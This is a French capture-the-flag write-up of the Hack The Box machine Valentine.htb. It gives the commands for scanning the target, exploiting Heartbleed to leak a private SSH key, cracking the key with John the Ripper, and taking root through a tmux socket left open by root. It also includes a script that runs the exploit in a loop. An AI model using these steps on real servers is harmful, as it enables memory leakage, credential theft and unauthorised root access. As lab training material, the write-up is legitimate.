---
title: "Valentine.htb — Exploitation de la vulnérabilité Heartbleed"
date: 2025-08-04
draft: false
tags: ["HTB", "CTF", "Heartbleed", "Linux", "PrivEsc"]
categories: ["CTF"]
---

## 🧠 Résumé

La machine `Valentine.htb` (Hack The Box) est une box de difficulté *Facile* exposant une vulnérabilité historique : **Heartbleed**. Grâce à une fuite de mémoire TLS, nous récupérons une clé privée chiffrée, que nous déchiffrons pour établir une connexion SSH. L’escalade de privilèges repose sur un processus `tmux` persistant lancé par root.

---

## 🔍 Phase de Reconnaissance

```bash
# Scan initial TCP full range
nmap -p- -sS -T4 valentine.htb

# Scan ciblé avec détection de version
nmap -p 22,80,443 -sC -sV valentine.htb
```

**Ports ouverts :**
- 22/tcp — SSH (OpenSSH 5.9p1 Debian)
- 80/tcp — HTTP (Apache 2.2.22)
- 443/tcp — HTTPS (Apache 2.2.22 avec SSL vulnérable)

---

## 🌐 Analyse Web

- Le port `80` affiche un logo et redirige vers `https://valentine.htb`.
- Une image `omg.jpg` est disponible mais ne contient rien de concluant en steganographie (`steghide`, `stegseek`).
- Un fichier `notes.txt` évoque un encoder/decoder côté client, en construction.

---

## ❤️ Exploitation Heartbleed (CVE-2014-0160)

Le service HTTPS utilise OpenSSL vulnérable :

```bash
nmap -p 443 --script ssl-heartbleed valentine.htb
```

Résultat :
```
State: VULNERABLE
```

Exploitation automatisée via script `heartbleed-exploit.py` :

```bash
python2 heartbleed-exploit.py valentine.htb --output dumps/out_001.txt --ascii
```

**Données récupérées :**
- Une clé au format hex : `hype_key`
- Convertie en PEM avec :
```bash
xxd -r -p hype_key > hype_key.pem
```

**Déchiffrement avec John the Ripper :**

```bash
ssh2john hype_key.pem > hype_key.hash
john hype_key.hash --wordlist=rockyou.txt
```

Mot de passe trouvé : `heartbleedbelievethehype`

---

## 🔐 Accès SSH

```bash
chmod 600 hype_key.pem
ssh -i hype_key.pem hype@valentine.htb
```

---

## 🔎 Post-Exploitation

### Fichier `.bash_history`

```bash
cat ~/.bash_history
```

Contient :
```bash
tmux -S /.devs/dev_sess
tmux a -t dev_sess
```

### Processus tmux (root)

```bash
ps aux | grep tmux
```

```bash
root       1040  0.0  0.1  26416  1672 ? Ss 01:24   0:00 /usr/bin/tmux -S /.devs/dev_sess
```

On peut l’attacher :

```bash
tmux -S /.devs/dev_sess attach
```

Et on obtient une session root. 🎉

---

## 🏁 Conclusion

Une machine pédagogique exploitant une faille emblématique. Elle montre :

- la dangerosité d'une vulnérabilité SSL
- l'intérêt de `bash_history`
- et l’importance de surveiller les processus persistants (comme `tmux`) pour l’escalade de privilèges

## 📜 Scripts utiles

### 🔁 heartbleed_full.sh
```bash
#!/bin/bash
echo "🔢 Nombre d'itérations Heartbleed à exécuter :"
read nb
for i in $(seq -f "%03g" 1 $nb); do
  echo "➡️  [Iteration $i]..."
  python2 heartbleed-exploit.py valentine.htb --output dumps/out_$i.txt --ascii
done

echo "🧪 Extraction des chaînes ASCII avec strings..."
mkdir -p ascii
for f in dumps/out_*.txt; do
  strings "$f" | grep -E '.{4,}' >> ascii/output_full.txt
done
echo "✅ Résultat regroupé dans ascii/output_full.txt"
```

### 🐍 heartbleed-exploit.py (extrait)
```python
# Extrait de heartbleed-exploit.py
def hexdump(payload, ascii_only, outfile):
    with open(outfile, 'w') as f:
        for b in range(0, len(payload), 16):
            lin = payload[b: b + 16]
            if ascii_only:
                text = ''.join(c if 32 <= ord(c) <= 126 else '' for c in lin)
                f.write(text)
            else:
                hex_bytes = ' '.join('%02X' % ord(c) for c in lin)
                ascii_text = ''.join(c if 32 <= ord(c) <= 126 else '.' for c in lin)
                f.write('%04x: %-48s %s\n' % (b, hex_bytes, ascii_text))
        f.write('\n')
```